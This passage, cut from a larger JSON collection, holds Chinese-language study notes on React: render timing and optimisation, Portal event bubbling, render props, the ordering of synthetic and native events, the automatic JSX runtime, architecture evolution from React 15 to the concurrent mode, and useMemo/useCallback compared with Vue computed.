引入了 Composition API 和基于 Proxy 的响应式系统，这些也是为了提高性能和灵活性。但总的来说，Vue 的设计使得它不需要像 Fiber 这样彻底的架构改变。\n","AVYR810y":"\n# React render 方法的原理和触发时机\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- React 的 render 过程\n\t - 执行 render 方法，获取虚拟 DOM\n\t- 对比虚拟 DOM（Diffing）\n\t- 更新真实 DOM\n- Render 的触发时机\n\t- 首次挂载时\n\t- props 变化\n\t- state 变化\n\t- 父组件重新渲染\n- 性能优化方法\n\t- React.memo\n\t- PureComponent\n\t- shouldComponentUpdate\n\t- 避免==内联==对象或函数 → 提出来\n\t- 使用 useMemo 缓存结果\n\t- 使用 useCallback 缓存函数\n- `static getDerivedStateFromProps(props, state) {`\n\t- 返回 `null` 表示不需要更新状态\n\t- 这个方法在==每次渲染前都会调用==，包括首次渲染\n\n## 2. Render 方法的基本原理\n\nReact 的 render 方法主要负责**将组件转换为虚拟 DOM**（Virtual DOM）：\n\n```jsx hl:3,15\n// 类组件中的 render\nclass MyComponent extends React.Component {\n  render() {\n    return (\n      <div>\n        <h1>{this.props.title}</h1>\n        <p>{this.props.content}</p>\n      </div>\n    );\n  }\n}\n\n// 函数组件\nfunction MyFunctionalComponent(props) {\n  // 整个函数体相当于 render 方法\n  return (\n    <div>\n      <h1>{props.title}</h1>\n      <p>{props.content}</p>\n    </div>\n  );\n}\n```\n\n## 3. Render 的执行过程\n\n 1. 执行 render 方法，获取虚拟 DOM\n 2. 对比虚拟 DOM（Diffing）\n 3. 更新真实 DOM\n\n```jsx hl:3,6,9\n// 简化的 render 过程\nconst render = (Component, props) => {\n  // 1. 执行 render 方法，获取虚拟 DOM\n  const vdom = Component(props);\n  \n  // 2. 对比虚拟 DOM（Diffing）\n  const patches = diff(previousVDOM, vdom);\n  \n  // 3. 更新真实 DOM\n  patch(realDOM, patches);\n}\n```\n\n## 4. Render 的触发时机\n\n### 4.1. 首次渲染\n\n```jsx\n// 组件首次挂载时\nReactDOM.render(\n  <App />,\n  document.getElementById('root')\n);\n```\n\n### 4.2. Props 改变\n\n```jsx\nfunction Parent() {\n  const [count, setCount] = useState(0);\n  \n  return (\n    <Child count={count} /> // props 改变会触发 Child 重新渲染\n  );\n}\n```\n\n### 4.3. State 改变\n\n```jsx\nfunction Counter() {\n  const [count, setCount] = useState(0);\n  \n  return (\n    <div>\n      <p>{count}</p>\n      <button onClick={() => setCount(count + 1)}>\n        Increment\n      </button>\n    </div>\n  );\n}\n```\n\n### 4.4. 父组件重新渲染\n\n```jsx\nfunction Parent() {\n  const [update, setUpdate] = useState(0);\n  \n  return (\n    <div>\n      <Child /> {/* Parent 重新渲染会导致 Child 也重新渲染 */}\n      <button onClick={() => setUpdate(update + 1)}>\n        Update Parent\n      </button>\n    </div>\n  );\n}\n```\n\n### 4.5. 性能优化方法\n\n#### 4.5.1. React.memo 用于函数组件\n\n```jsx\nconst MemoizedComponent = React.memo(function MyComponent(props) {\n  return (\n    <div>{props.value}</div>\n  );\n});\n```\n\n#### 4.5.2. PureComponent 用于类组件\n\n```jsx\nclass MyPureComponent extends React.PureComponent {\n  render() {\n    return (\n      <div>{this.props.value}</div>\n    );\n  }\n}\n```\n\n#### 4.5.3. shouldComponentUpdate 用于自定义更新逻辑\n\n```jsx\nclass MyComponent extends React.Component {\n  shouldComponentUpdate(nextProps, nextState) {\n    return this.props.value !== nextProps.value;\n  }\n  \n  render() {\n    return (\n      <div>{this.props.value}</div>\n    );\n  }\n}\n```\n\n## 5. 常见的渲染优化问题\n\n### 5.1. 避免在渲染中创建新对象或函数\n\n```jsx hl:4\n// 不好的写法\nfunction BadComponent() {\n  return (\n    <button onClick={() => console.log('clicked')}>  // 每次渲染都创建新函数\n      Click me\n    </button>\n  );\n}\n\n// 好的写法\nfunction GoodComponent() {\n  const handleClick = useCallback(() => {\n    console.log('clicked');\n  }, []);\n  \n  return (\n    <button onClick={handleClick}>\n      Click me\n    </button>\n  );\n}\n```\n\n### 5.2. 使用 useMemo 缓存计算结果\n\n```jsx\nfunction ExpensiveComponent({ data }) {\n  const processedData = useMemo(() => {\n    return data.map(item => expensiveCalculation(item));\n  }, [data]);\n  \n  return <div>{processedData}</div>;\n}\n```\n\n## 6. 渲染阶段的生命周期\n\n对于类组件，render 相关的生命周期方法执行顺序：\n\n```jsx\nclass LifecycleComponent extends React.Component {\n\n  // 1. 在 render 之前\n\n\t注意点：\n\t1. getDerivedStateFromProps 是静态方法，无法访问 this\n\t2. 应该谨慎使用，大多数情况下可以用其他方式替代\n\t3. 返回 null 表示不需要更新状态\n\t4. 这个方法在每次渲染前都会调用，包括首次渲染\n\t5. 适合用于状态需要根据 props 变化而变化的场景\n\n  static getDerivedStateFromProps(props, state) {\n\t\t// 当 props.email 改变时更新 state\n\t   if (props.email !== state.prevEmail) {\n\t     return {\n\t       email: props.email,\n\t       prevEmail: props.email\n\t     };\n\t   }\n\t   \n    return null; // 返回 null 表示不需要更新状态\n  }\n  \n  // 2. 判断是否需要更新\n  shouldComponentUpdate(nextProps, nextState) {\n    return true;\n  }\n  \n  // 3. render 方法\n  render() {\n    return <div>Content</div>;\n  }\n  \n  // 4. render 后，更新前\n  getSnapshotBeforeUpdate(prevProps, prevState) {\n    return null;\n  }\n  \n  // 5. 更新后\n  componentDidUpdate(prevProps, prevState, snapshot) {\n  }\n}\n```\n\n## 7. 总结\n\n1. Render 方法是 React 组件的核心，**负责生成虚拟 DOM**。\n2. 触发时机包括：\n\t- 首次渲染、props 变化、state 变化、父组件重渲染。\n3. React 提供了多种优化方法来避免不必要的渲染。\n4. 合理使用这些优化方法可以显著提升应用性能。\n5. 理解渲染原理和触发时机对于编写高性能的 React 应用至关重要。\n\n![图片&文件](./files/20241111-18.png)\n\n","SHqMKSK2":"\n# React 中的 Portal  事件冒泡机制\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- React 中的 Portal 的点击事件，同样遵循 ==React 事件系统==的冒泡机制，不依赖于它真实的渲染结构(与实际的 DOM 结构无关)\n\t- ReactDOM.createPortal\n\t\t- 使用 `e.stopPropagation()` 来阻止事件冒泡\n- Portal 的 context 同样从父组件继承而来\n\n## 2. 展开\n\n![图片&文件](./files/20241111-15.png)\n\n首先，让我们明确一下什么是 Portal：\n\n```jsx\nimport ReactDOM from 'react-dom';\n\nfunction Modal({ children }) {\n  return ReactDOM.createPortal(\n    children,\n    document.getElementById('modal-root')\n  );\n}\n```\n\nPortal 允许我们将子节点渲染到存在于父组件以外的 DOM 节点中。\n\n现在，关于你的问题：**在 React 中，即使子组件是一个 Portal，发生在其中的点击事件仍然能够冒泡到父组件。**\n\n这看起来可能有点反直觉，因为在 DOM 结构中，Portal 的内容实际上是在父组件之外的。但是 React 特意设计了这种行为，以保持一致性和方便性。\n\n这种行为有几个重要的特点：\n\n1. **一致性**：无论子组件是否通过 Portal 渲染，事件冒泡的行为都是一致的。这使得开发者可以更容易地理解和预测事件的流动。\n2. **灵活性**：你可以在 Portal 内部处理事件，同时也可以让事件冒泡到 Portal 之外的父组件。\n3. **控制**：如果你不想让事件冒泡到 Portal 外部，你可以在 Portal 内部的事件处理函数中调用 `e.stopPropagation()`。\n4. **注意 DOM 结构**：虽然在 React 的事件系统中事件会冒泡，但在实际的 DOM 结构中，Portal 的内容是在父组件之外的。这意味着如果你使用原生 DOM 事件监听器，行为可能会有所不同。\n\n总结：\n- 在 React 中，Portal 内部的事件可以冒泡到 Portal 外部的父组件。\n- 这是 React 特意设计的行为，为了保持一致性和方便性。\n- 你可以使用 `e.stopPropagation()` 来阻止事件冒泡，如果需要的话。\n- 这个行为是 React 事件系统的特性，与实际的 DOM 结构无关。\n\n这种设计使得 Portal 在保持灵活性的同时，也能够与 React 的组件树结构保持一致的事件传播行为。\n","But9tmZF":"\n# React 的 Render Props\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 传入一个 `prop.render`\n\t- 来传递需要渲染的内容\n- 有点类似于 Vue 的作用域插槽\n\n## 2. 基本概念\n\n```javascript\n// Render Props 的基本形式\n<DataProvider render={data => (\n  <h1>Hello {data.name}</h1>\n)}/>\n```\n\n这是一种组件**通过一个函数 prop 来传递需要渲染的内容的技术**。\n\n>  这个 prop **通常命名为 render，但不是必须的**。\n\n## 3. 具体示例：以一个鼠标追踪器为例\n\n```javascript hl:16\n// MouseTracker 组件\nclass MouseTracker extends React.Component {\n  state = { x: 0, y: 0 };\n\n  handleMouseMove = (event) => {\n    this.setState({\n      x: event.clientX,\n      y: event.clientY\n    });\n  }\n\n  render() {\n    return (\n      <div onMouseMove={this.handleMouseMove}>\n        {/* 调用 render prop */}\n        {this.props.render(this.state)}\n      </div>\n    );\n  }\n}\n\n// 使用 MouseTracker\n<MouseTracker\n  render={({ x, y }) => (\n    <h1>鼠标位置：({x}, {y})</h1>\n  )}\n/>\n```\n\n## 4. children prop 方式\n\n```javascript hl:8\n// 也可以使用 children 作为函数\nclass MouseTracker extends React.Component {\n  // ... 同上的 state 和 handleMouseMove\n\n  render() {\n    return (\n      <div onMouseMove={this.handleMouseMove}>\n        {this.props.children(this.state)}\n      </div>\n    );\n  }\n}\n\n// 使用方式\n<MouseTracker>\n  {({ x, y }) => (\n    <h1>鼠标位置：({x}, {y})</h1>\n  )}\n</MouseTracker>\n```\n\n## 5. 现代替代方案现：在更推荐使用 Hooks 来实现类似功能\n\n```javascript\nfunction useMousePosition() {\n  const [position, setPosition] = useState({ x: 0, y: 0 });\n\n  useEffect(() => {\n    const handleMouseMove = (event) => {\n      setPosition({ x: event.clientX, y: event.clientY });\n    };\n\n    window.addEventListener('mousemove', handleMouseMove);\n    return () => window.removeEventListener('mousemove', handleMouseMove);\n  }, []);\n\n  return position;\n}\n\n// 使用\nfunction App() {\n  const { x, y } = useMousePosition();\n  return <h1>鼠标位置：({x}, {y})</h1>;\n}\n```\n\n## 6. Vue 的解决方案\n\n`Vue 的作用域插槽`和 `React 的 Render Props` 是**解决相同问题的不同方案**\n\n## 7. 最后\n\n- Render Props 是 React **早期**一个重要的代码复用模式\n- 现在有了 Hooks 这样更**现代**的解决方案\n\n","jdH7J1Dy":"\n# React 的合成事件(Synthetic Event)和原生事件(Native Event)的执行顺序\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 执行顺序：==原生捕获 → React 捕获 → React 冒泡 → 原生冒泡==\n\t1. document 原生事件：捕获阶段\n\t2. 子元素 原生事件：捕获阶段\n\t3. 父元素 React事件：捕获\n\t4. 子元素 React事件：捕获\n\t5. 子元素 React事件：冒泡\n\t6. 父元素 React事件：冒泡\n\t7. 子元素 原生事件：冒泡阶段\n\t8. document 原生事件：冒泡阶段\n- 事件委托\n\t- React 事件是委托到 `root节点` 统一管理\n\t\t- 使得==多个 React 版本共存==成为可能\n- 阻止事件传播\n\t- e.stopPropagation(); \n\t\t- 阻止==React事件==传播\n\t- e.nativeEvent.stopImmediatePropagation(); \n\t\t- 阻止==原生事件==传播\n- ==合成事件==的特点：\n\t- ==抹平==了浏览器之间的兼容性差异\n\t- 事件代理\n\t\t- 对事件进行==统一的处理和优化==\n\t- 符合 W3C 规范\n\t- 可以通过 `e.nativeEvent` 访问原生事件对象\n- 事件系统实现原理\n\t- 事件注册阶段\n\t\t- React 在初始化时，会在 root 容器上注册所有需要的事件（如 click、change 等）\n\t\t- 所有事件都会被存储在一个 Map 中进行统一管理\n\t\t- 通过 JSX 中声明的事件，会存储在组件的 fiber 节点中\n\t- 事件触发阶段\n\t\t- 事件触发时，首先**生成合成事件对象**\n\t\t- 按照事件传播的特性（捕获 -> 目标 -> 冒泡）遍历节点\n\t\t- 调用对应的事件处理函数\n- 事件池\n\t- ![图片&文件](./files/20250101-3.png)\n\n\n\n\n> 另外可参考 [21.  React 事件系统](/post/fzY9DIRJ.html)\n\n## 2. 事件执行顺序\n\n```javascript\nfunction App() {\n  const divRef = useRef(null);\n\n  useEffect(() => {\n    const div = divRef.current;\n    \n    // 添加原生事件监听器\n    div.addEventListener('click', () => {\n      console.log('原生事件：冒泡阶段');\n    });\n\n    div.addEventListener('click', () => {\n      console.log('原生事件：捕获阶段');\n    }, true);  // true表示捕获阶段\n\n    return () => {\n      // 清理事件监听\n      div.removeEventListener('click');\n    };\n  }, []);\n\n  return (\n    <div \n      ref={divRef}\n      onClick={() => console.log('React事件：冒泡阶段')}\n      onClickCapture={() => console.log('React事件：捕获阶段')}>\n      点击我\n    </div>\n  );\n}\n```\n\n当点击div时，事件执行顺序为：\n\n1. 原生事件（捕获阶段）\n2. React事件（捕获阶段）\n3. React事件（冒泡阶段）\n4. 原生事件（冒泡阶段）\n\n## 3. 更复杂的嵌套结构来展示事件传播\n\n```javascript\nfunction Parent() {\n  useEffect(() => {\n    document.addEventListener('click', () => {\n      console.log('document 原生事件：捕获阶段');\n    }, true);\n\n    document.addEventListener('click', () => {\n      console.log('document 原生事件：冒泡阶段');\n    });\n  }, []);\n\n  return (\n    <div \n      onClick={() => console.log('父元素 React事件：冒泡')}\n      onClickCapture={() => console.log('父元素 React事件：捕获')}\n    >\n      <Child />\n    </div>\n  );\n}\n\nfunction Child() {\n  const childRef = useRef(null);\n\n  useEffect(() => {\n    const child = childRef.current;\n    child.addEventListener('click', () => {\n      console.log('子元素 原生事件：冒泡阶段');\n    });\n\n    child.addEventListener('click', () => {\n      console.log('子元素 原生事件：捕获阶段');\n    }, true);\n  }, []);\n\n  return (\n    <button \n      ref={childRef}\n      onClick={() => console.log('子元素 React事件：冒泡')}\n      onClickCapture={() => console.log('子元素 React事件：捕获')}\n    >\n      点击我\n    </button>\n  );\n}\n```\n\n点击按钮时的执行顺序：\n\n```\n1. document 原生事件：捕获阶段\n2. 子元素 原生事件：捕获阶段\n3. 父元素 React事件：捕获\n4. 子元素 React事件：捕获\n5. 子元素 React事件：冒泡\n6. 父元素 React事件：冒泡\n7. 子元素 原生事件：冒泡阶段\n8. document 原生事件：冒泡阶段\n```\n\n## 4. 主要区别\n\n### 4.1. 事件委托机制\n\n- React事件是委托到 `root节点` 统一管理\n- 原生事件是直接绑定到DOM元素上\n\n### 4.2. 事件对象\n\n```javascript hl:4,3,6\nfunction HandleEvent({ onClick }) {\n  const handleClick = (e) => {\n    console.log('React合成事件对象：', e); // SyntheticEvent\n    console.log('原生事件对象：', e.nativeEvent); // 原生Event\n    \n    // React 17之后，e.persist()不再需要\n    // 事件对象可以被异步访问\n    setTimeout(() => {\n      console.log('异步访问事件对象：', e);\n    }, 0);\n    \n  };\n\n  return <button onClick={handleClick}>点击</button>;\n}\n```\n\n## 5. 阻止事件传播\n\n```javascript hl:7,8\nfunction StopPropagation() {\n  const handleParentClick = (e) => {\n    console.log('父元素被点击');\n  };\n\n  const handleChildClick = (e) => {\n    e.stopPropagation(); // 阻止React事件传播\n    e.nativeEvent.stopImmediatePropagation(); // 阻止原生事件传播\n    console.log('子元素被点击');\n  };\n\n  return (\n    <div onClick={handleParentClick}>\n      <button onClick={handleChildClick}>点击我</button>\n    </div>\n  );\n}\n```\n\n## 6. 实际应用场景\n\n```javascript hl:3,4\nfunction Modal({ onClose }) {\n  const handleBackdropClick = (e) => {\n    // 确保只有点击背景时才关闭\n    if (e.target === e.currentTarget) {\n      onClose();\n    }\n  };\n\n  const handleContentClick = (e) => {\n    // 阻止事件冒泡，避免触发背景点击\n    e.stopPropagation();\n  };\n\n  return (\n    <div className=\"backdrop\" onClick={handleBackdropClick}>\n      <div className=\"modal-content\" onClick={handleContentClick}>\n        模态框内容\n      </div>\n    </div>\n  );\n}\n```\n\n## 7. 注意事项\n\n### 7.1. 在使用原生事件时，记得在组件卸载时清理\n\n```javascript\nuseEffect(() => {\n  const handler = () => console.log('原生事件');\n  element.addEventListener('click', handler);\n  return () => element.removeEventListener('click', handler);\n}, []);\n```\n\n## 8. React 17 前后的事件委托变化\n\n- 事件不再绑定到 `document`，而是绑定到`root节点`\n\t- 这使得**多个 React 版本共存成为可能**\n\n![图片&文件](./files/20241111-26.png)\n\n## 9. 性能考虑\n\n- 优先使用 React 的合成事件系统\n- 只在特殊情况下使用原生事件（如需要捕获特定的键盘事件）\n\n## 10. React 的事件系统实现原理\n\n### 10.1. 事件委托（Event Delegation）\n\nReact 实现了一个统一的事件系统，采用事件委托的方式：\n- 所有事件都绑定到 document 上（在 React 17 之后改为绑定到 root 容器上）\n- 当事件触发时，React 会找到对应的组件，然后执行相应的事件处理函数\n- 这种方式可以提高性能，减少内存占用\n\n### 10.2. 合成事件（SyntheticEvent）\n\nReact 自己实现了一套事件机制，叫做 `SyntheticEvent`（合成事件）：\n\n```javascript\n// React 事件示例\nconst Button = () => {\n  const handleClick = (e) => {\n    // e 是 SyntheticEvent 对象，而不是原生的 event\n    console.log(e);\n  }\n  \n  return <button onClick={handleClick}>点击</button>\n}\n```\n\n合成事件的特点：\n- 抹平了浏览器之间的兼容性差异\n- 对事件进行统一的处理和优化\n- 符合 W3C 规范\n- 可以通过 `e.nativeEvent` 访问原生事件对象\n\n### 10.3. 事件注册和触发流程\n\n#### 10.3.1. **事件注册阶段**\n\n   - React 在初始化时，会在 root 容器上注册所有需要的事件（如 click、change 等）\n\t   - 所有事件都会被存储在一个 Map 中进行统一管理\n   - 通过 JSX 中声明的事件，会存储在组件的 fiber 节点中\n\n#### 10.3.2. **事件触发阶段**\n\n- 事件触发时，首先**生成合成事件对象**\n- 按照事件传播的特性（捕获 -> 目标 -> 冒泡）遍历节点\n- 调用对应的事件处理函数\n\n### 10.4. 事件池（Event Pool）\n\n在 React 17 之前：\n\n- React 维护了一个**事件池**，用于==存放事件对象==\n- 事件处理完成后，事件对象会被清空并放回池中重用\n- 这就是为什么在==异步操作中无法访问事件对象==\n```javascript \n// React 16 及之前版本\nfunction handleClick(e) {\n  // ❌ 这样无法工作\n  setTimeout(() => {\n    console.log(e.target.value);  // 此时 e 已被清空\n  }, 100);\n  \n  // ✅ 需要手动持久化\n  e.persist();\n  setTimeout(() => {\n    console.log(e.target.value);  // 现在可以工作了\n  }, 100);\n}\n```\n\nReact 17 之后：\n- 移除了事件池机制\n- 事件对象可以在异步操作中被访问\n- 提升了开发体验\n\n### 10.5. 执行顺序\n\nReact 事件和原生事件的执行顺序：\n\n1. 原生事件捕获阶段\n2. React 事件捕获阶段\n3. React 事件冒泡阶段\n4. 原生事件冒泡阶段\n\n```javascript hl:6\n// 事件执行顺序示例\n<div onClick={e => console.log('原生事件：冒泡')} \n     onClickCapture={e => console.log('原生事件：捕获')}>\n  <button \n    onClick={e => console.log('React事件：冒泡')}\n    onClickCapture={e => console.log('React事件：捕获')}>\n    点击\n  </button>\n</div>\n```\n\n### 10.6. React 的合成事件与原生事件之间存在一些重要的交互特性\n\n- 当同一个 DOM 同时绑定了原生事件和合成事件时，原生事件会先触发\n- 在原生事件中调用 stopPropagation() 会**阻止合成事件的执行**\n\t- 这是因为合成事件依赖事件冒泡到 document（或 root）节点来实现事件委托","B4WYHcR4":"\n# React 自动运行时（Automatic Runtime）\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- React 17 或更高版本，==不需要在文件顶部显式导入 React==，而是会**自动引入必要的方法**\n\t- Babel 中 `@babel/preset-react` 配置为 `runtime:automatic`\n\n## 2. 基本概念\n\n- 自动运行时是 React 17 引入的一个重要特性，它改变了 JSX 的转换方式。\n- 这个新的 JSX 转换不需要在文件顶部显式导入 React，而是**自动引入必要的方法**\n\n### 2.1. 传统方式 vs 新方式\n\n```javascript\n// 传统方式\nimport React from 'react';\nconst element = <h1>Hello, world!</h1>;\n\n// 新方式（自动运行时）\n// 不需要导入 React\nconst element = <h1>Hello, world!</h1>;\n```\n\n## 3. 工作原理\n\n### 3.1. 编译转换\n\n```javascript\n// JSX 代码\nfunction App() {\n  return <h1>Hello World</h1>;\n}\n\n// 传统转换（React.createElement）\nfunction App() {\n  return React.createElement('h1', null, 'Hello World');\n}\n\n// 新的转换（jsx 函数）\nimport {jsx as _jsx} from 'react/jsx-runtime';\n\nfunction App() {\n  return _jsx('h1', { children: 'Hello World' });\n}\n```\n\n自动运行时会自动从 `react/jsx-runtime` 导入必要的函数，而不是使用 `React.createElement` \n\n## 4. 主要优势\n\n### 4.1. 性能优化\n\n- 减少了打包体积\n- 提高了编译效率\n- 运行时性能更好\n- 更少的中间代码 \n\n### 4.2. 开发体验\n\n- 不需要手动导入 React\n- 代码更简洁\n- 更少的模板代码\n- 更好的工具支持 \n\n## 5. 配置方法\n\n### 5.1. Babel 配置\n\n```json hl:4\n{\n  \"presets\": [\n    [\"@babel/preset-react\", {\n      \"runtime\": \"automatic\"\n    }]\n  ]\n}\n```\n\n### 5.2. TypeScript 配置\n\n```json hl:3\n{\n  \"compilerOptions\": {\n    \"jsx\": \"react-jsx\"\n  }\n}\n```\n\n从 Babel 8 开始，\"`automatic`\" 将成为两个插件的默认运行时 \n\n## 6. 实现细节\n\n### 6.1. JSX 运行时函数\n\n```javascript hl:7\n// react/jsx-runtime 中的函数\nexport function jsx(type, props, key) {\n  // ...实现细节\n}\n\nexport function jsxs(type, props, key) {\n  // 用于静态子元素\n  // ...实现细节\n}\n```\n\n### 6.2. 关键特性\n\n- 自动导入必要的函数\n- 优化的编译输出\n- 更好的树摇（tree-shaking）支持\n- 与现有代码完全兼容 \n\n## 7. 使用注意事项\n\n### 7.1. 兼容性考虑\n\n- 确保使用 React 17 或更高版本\n- 更新构建工具配置\n- 检查第三方库兼容性\n- 注意开发工具支持 \n\n### 7.2. 常见问题\n\n- 某些旧版工具可能需要额外配置\n- 某些库可能仍需要显式导入 React\n- 开发环境和生产环境可能有差异\n- 需要注意 HMR（热模块替换）的配置 \n\n## 8. 推荐用法\n\n```javascript\n// ✅ 推荐\nfunction Component() {\n  return <div>Hello</div>;\n}\n\n// ❌ 不再需要\nimport React from 'react';\nfunction Component() {\n  return <div>Hello</div>;\n}\n```\n\n","jli0LDSX":"\n# React 的架构设计演变\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 性能瓶颈来源，就==两个==\n\t- cpu 瓶颈\n\t- io 瓶颈\n- 架构演变\n\t- 15 及之前 → 协调器 + 渲染器\n\t- 16 及之后 → 协调器 + 渲染器 + 调度器\n\t\t- 可中断更新\n\n## 2. 前端框架性能问题都可以归因以下两个\n\n### 2.1. CPU 瓶颈\n\n- JavaScript 是**单线程**执行的\n- 在主线程上进行大量计算会阻塞渲染\n- 长任务（>50ms）会导致页面响应迟钝\n\t- 比如同时渲染 30000 个 DOM\n\t- vdom 相关的处理\n\t\t- 所以，要求 React 具有将长任务拆解的能力，即时间切片 `time slice`\n\n未使用时间切片的效果如下：\n\n![图片&文件](./files/20241029.png)\n\n使用时间切片的效果如下：**很平滑**\n\n![图片&文件](./files/20241029-1.png)\n\n### 2.2. I/O 瓶颈\n\n- 主要的 `I/O 瓶颈`是网络\n- 又比如输入打字\n- 解决方案\n\t- 结合==人机交互==，**用户对不同的操作的感知敏感度不一样**，比如\n\t\t- 键盘输入到显示，稍微延迟，用户也能感觉到\n\t\t- 鼠标悬停，稍微延迟，用户也能感觉到\n\t\t- 点击按钮，到数据显示，有点延迟用户也能接受\n\t- 所以，对不同操作，要求 React 具有\n\t\t- 有优先级调度的能力，这就要求\n\t\t\t- 调用算法\n\t\t\t- 可中断 VDOM，毕竟不中断，CPU 一直占着\n\n## 3. React 架构演变\n\n### 3.1. React 15 ：Reconciler 架构\n\n![图片&文件](./files/20241031-21.png)\n\n#### 3.1.1. Reconciler 协调器\n\n同步的，VDOM 的实现\n\n```javascript hl:3\n// React15 中的递归处理示意\nfunction reconcileChildrenArray(returnFiber, currentFirstChild, newChildren) {\n  // 同步递归处理，无法中断\n  for (let i = 0; i < newChildren.length; i++) {\n    reconcileChildrenArray(/*...*/)\n  }\n}\n```\n\n#### 3.1.2. Renderer 渲染器\n\n负责将 UI变化渲染到宿主环境\n\n### 3.2. React 16 ：支持时间切片的 Fiber Reconciler\n\n![图片&文件](./files/20241031-22.png)\n\n- 新引入：`Scheduler 调度器`\n\t- 调度任务的优先级，高优的优先进入 Reconciler\n- `Reconciler 协调器`：\n\t- VDOM 的实现，计算出 UI 的变化\n- Renderer 渲染器：\n\t- 负责将 UI 变化渲染到宿主环境\n\n#### 3.2.1. 演示更新效果\n\n![图片&文件](./files/20241029-2.png)\n\n### 3.3. Legacy（遗产） 模式（React 16/17 默认模式）\n\n这是 React 最古老的渲染模式，通过 `ReactDOM.render()` 创建应用。\n\n```javascript\n// Legacy 模式\nimport ReactDOM from 'react-dom';\n\nReactDOM.render(\n  <App />,\n  document.getElementById('root')\n);\n```\n\n#### 3.3.1. 特点：\n\n1. 同步渲染\n2. 不支持新的并发特性\n3. 更新是同步的且不可中断\n\n### 3.4. Blocking 模式（React 16.x 实验性）\n\n这是向并发模式过渡的中间模式。\n\n`createBlockingRoot`\n\n```javascript hl:4\n// Blocking 模式\nimport ReactDOM from 'react-dom';\n\nReactDOM.createBlockingRoot(\n  document.getElementById('root')\n).render(<App />);\n```\n\n#### 3.4.1. 特点：\n\n1. **部分并发**模式特性\n2. 比 Legacy 模式更接近并发\n3. 作为过渡阶段的模式\n\n### 3.5. Concurrent 模式（React 18+）\n\n最新的渲染模式，支持所有新特性\n\n`createRoot`\n\n```javascript hl:5\n// Concurrent 模式\nimport ReactDOM from 'react-dom/client';\n\n// 创建根节点\nconst root = ReactDOM.createRoot(\n  document.getElementById('root')\n);\n\n// 渲染应用\nroot.render(<App />);\n```\n\n#### 3.5.1. 特点：\n\n1. 完整的并发特性支持\n2. 可中断的渲染\n3. 自动批处理\n4. 优先级调度\n\n#### 3.5.2. 示例：使用 startTransition 将状态更新标记为非紧急，降低优先级\n\n```javascript hl:12,9\n// Concurrent 模式特性示例\nfunction ConcurrentComponent() {\n  const [isPending, startTransition] = useTransition();\n  const [list, setList] = useState([]);\n  const [query, setQuery] = useState('');\n\n  // 搜索处理\n  const handleSearch = (e) => {\n    // 立即更新输入值（高优先级）\n    setQuery(e.target.value);\n\n    // 将搜索结果更新标记为转换（低优先级）\n    startTransition(() => {\n      const searchResults = performExpensiveSearch(e.target.value);\n      setList(searchResults);\n    });\n  };\n\n  return (\n    <div>\n      <input\n        value={query}\n        onChange={handleSearch}\n        placeholder=\"Search...\"\n      />\n      \n      {isPending ? (\n        <div>Loading...</div>\n      ) : (\n        <ul>\n          {list.map(item => (\n            <li key={item.id}>{item.name}</li>\n          ))}\n        </ul>\n      )}\n    </div>\n  );\n}\n```\n\n## 4. 架构分层与核心包的关系\n\n![undefined](#)","NrJ6ycel":"\n# useMemo 、 useCallback、Vue 的 computed\n\n`#React` `#vue3`  \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- useMemo 、 useCallback 的 执行时机：\n\t- 首次渲染时，执行一次\n\t- 再之后就依赖于`依赖项数组`\n- 目的是为了优化性能，缓存==值或函数==\n- useMemo 与 useCallback 的区别\n\t- 用途：\n\t\t- useMemo：缓存**函数计算的结果**\n\t\t- useCallback：缓存**函数引用**\n\t- 返回值：\n\t\t- useMemo：返回缓存的**值**\n\t\t- useCallback：返回缓存的**函数**\n\t- 使用场景：\n\t\t- useMemo：\n\t\t\t- 昂贵的计算操作\n\t\t\t- 复杂的数据处理\n\t\t\t- 需要缓存引用的对象\n\t\t- useCallback：\n\t\t\t- **传递给子组件的回调函数**\n\t\t\t- 防止不必要的重渲染， ==防止子组件重渲染==\n\t\t\t- 需要保持**函数引用稳定**的场景\n\t- 性能考虑：\n\t\t- 不是所有值都需要 useMemo\n\t\t- 不是所有函数都需要 useCallback\n\t\t- 应该在实际遇到性能问题时才使用\n- useCallback 一般配合 React.memo 使用，也可作为 `useEffect` 的依赖项的函数\n- React 的 `useEffect` ==对应类比== Vue 的 `watch 或 watchEffect`\n\n## 2. 执行时机\n\n- 组件`首次`渲染时执行一次\n- 在之后，当且仅当`依赖项`发生变化时重新执行\n- 如果依赖项没有变化\n\t- 即使组件重新渲染，也会直接使用缓存的值而不执行回调\n\n## 3. 最佳实践\n\n- 简单计算不需要 `useMemo`，因为\n\t- `useMemo` 本身也有开销（创建函数、维护依赖列表等）\n\t- 主要用于优化`复杂计算`或需要`保持引用稳定`的场景\n\t\t- 因为只在依赖项改变时`创建新对象`\n- 正确的依赖项设置\n\t- 比如依赖项数组为空，但使用了 `props.data`\n- 避免在 `useMemo` 中进行副作用操作，比如请求数据\n\t- 正确的做法是：\n\t\t- 使用 `useEffect` 处理副作用，然后请求完数据后，设置 `data`，然后再将 `data` 作为依赖项\n\n## 4. 注意事项\n\n- 别使用 `{ ...data }` ，每次都不一样，导致缓存失败\n\t- 可**指定具体依赖属性值**，比如 `data.id`\n- useMemo 别放到 if 语句中，清在**顶层**使用\n- 如果需要依赖项的深度比较\n\t- 建议 1：使用具体属性\n\t- 建议 2：深拷贝，但不建议\n- 添加必要依赖项，否则可能会闭包陷阱（即使用了旧的变量）\n\n## 5. 配合其他 hooks 使用\n\n```javascript\nfunction OptimizedComponent() {\n  // 1. 与 useState 配合\n  const [data, setData] = useState([]);\n  \n  // 2. 与 useCallback 配合\n  const memoizedData = useMemo(() => {\n    return processData(data);\n  }, [data]);\n  \n  const handleData = useCallback(() => {\n    doSomethingWith(memoizedData);\n  }, [memoizedData]); // 使用 memoized 值作为依赖\n}\n\n```\n\n## 6. 和 vue 的 computed 的异同\n\n- 响应式系统：\n\t- Vue computed 基于响应式系统（ref/reactive）\n\t- React useMemo 基于`依赖数组`比较\n- 是否`自动`依赖追踪\n\t- Vue computed `自动追踪依赖`，更符合响应式编程\n\t- React useMemo 需要手`动声明依赖`，更显式\n- 